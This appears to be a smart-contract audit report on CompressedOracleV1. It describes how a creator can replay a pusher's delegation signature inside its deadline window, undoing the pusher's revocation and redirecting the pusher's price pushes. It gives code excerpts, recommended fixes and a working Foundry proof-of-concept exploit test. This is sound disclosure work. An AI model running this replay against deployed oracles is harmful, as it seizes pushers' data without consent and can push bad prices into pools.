### Title
Delegation consent signature is replayable within its deadline window, allowing a creator to re-establish a revoked pusher delegation and redirect price pushes into their namespace without the pusher's current consent - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary

`allowPushers` in `CompressedOracleV1` does not invalidate or track used delegation signatures. After a pusher calls `revokePusher()` to clear their delegation, the creator who holds the original consent signature can call `allowPushers` again with the identical `(deadline, pusher, signature)` tuple — the deadline check passes because the deadline has not expired, and the ECDSA recovery succeeds because the signed message is identical. The revocation is silently undone, and subsequent fallback pushes from the pusher land in the creator's namespace instead of the pusher's own namespace, without the pusher's current consent.

The code's own NatSpec comment acknowledges the exact attack vector but incorrectly claims the deadline prevents it: *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* The deadline prevents replay after expiry, but does nothing to prevent replay within the deadline window.

### Finding Description

**Root cause:** The delegation signature hash contains no nonce and no per-use invalidation marker:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only freshness gate is `_ensureDeadline(deadline)`:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

`revokePusher()` clears `namespaceRemapping[msg.sender]` to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But nothing prevents the creator from calling `allowPushers` again with the same signature to restore `namespaceRemapping[pusher] = creator`.

**Exploit path:**

1. Pusher P signs consent: `keccak256(abi.encode(chainid, oracle, deadline=T+30days, P, Creator1))`. Creator1 calls `allowPushers(T+30days, [P], [sig])` → `namespaceRemapping[P] = Creator1`.
2. P decides to revoke: calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
3. Creator1 calls `allowPushers(T+30days, [P], [sig])` again with the identical arguments. `_ensureDeadline` passes (deadline not expired). ECDSA recovery returns P. `namespaceRemapping[P] = Creator1` is written again.
4. P's subsequent fallback pushes resolve `namespaceRemapping[msg.sender] = Creator1` and write into Creator1's namespace, not P's own namespace. [4](#0-3) 

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So P's pushes, which P believes are going to their own namespace, are silently redirected to Creator1's namespace.

### Impact Explanation

The pusher's `revokePusher()` call is rendered ineffective for the entire remaining lifetime of the deadline. The creator can force the pusher's price data into their namespace without the pusher's current consent. Any pool or price provider consuming Creator1's namespace feeds will receive price data that the pusher did not intend to contribute to that namespace. If the pusher is pushing prices to what they believe is their own isolated namespace (e.g., for a different integrator), those prices are silently captured by Creator1 and exposed to pools using Creator1's feeds. This constitutes unauthorized namespace write authority and can result in bad-price execution reaching pool swaps.

### Likelihood Explanation

The creator necessarily holds the pusher's signature (they submitted it in the original `allowPushers` call). Replaying it requires a single additional transaction. Any creator who wants to retain a pusher's price contributions after the pusher revokes can trivially do so. The deadline window is set by the creator and can be arbitrarily long (e.g., 30 days, 1 year). The pusher has no on-chain mechanism to prevent this within the deadline window.

### Recommendation

Track used signatures with a `mapping(bytes32 => bool) public usedDelegationSignatures` and mark each signature hash as consumed on first use:

```solidity
bytes32 sigHash = keccak256(signatures[i]);
require(!usedDelegationSignatures[sigHash], "signature already used");
usedDelegationSignatures[sigHash] = true;
```

Alternatively, include a per-pusher nonce in the signed message so that each consent is single-use:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]++))
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator;

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        creator = address(0xC0FFEE);
        vm.warp(1_700_000_000);
    }

    function test_replay_after_revoke() public {
        uint256 deadline = block.timestamp + 30 days;

        // 1. Pusher signs consent for creator
        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoke should clear mapping");

        // 4. Creator replays the SAME signature — revocation is undone
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert!
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established without pusher consent");

        // 5. Pusher's subsequent push lands in creator's namespace, not pusher's own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        word |= uint256(uint48((uint48(1_000_000) << 16) | (uint48(5) << 8) | uint48(3))) << 208;
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Creator's namespace has the price; pusher's own namespace is empty
        bytes32 creatorFeed = oracle.feedIdOf(creator, 0, 0);
        bytes32 pusherFeed  = oracle.feedIdOf(pusher,  0, 0);
        assertGt(oracle.getOracleData(creatorFeed).price, 0, "creator got pusher's price");
        assertEq(oracle.getOracleData(pusherFeed).price,  0, "pusher's own namespace empty");
    }
}
```
